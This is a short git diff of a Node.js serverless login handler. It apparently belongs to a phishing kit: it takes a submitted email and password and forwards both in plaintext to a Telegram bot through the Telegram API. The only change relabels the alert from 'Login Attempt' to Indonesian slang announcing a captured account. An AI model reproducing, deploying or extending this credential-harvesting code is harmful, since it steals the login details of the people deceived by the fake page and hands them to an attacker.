@@ -28,7 +28,7 @@ module.exports = async (req, res) => {
         return res.status(400).json({ error: 'Email and password are required' });
     }
 
-    const message = `🔐 *Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
+    const message = `🔐 *Lapor ada akun nih*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     try {
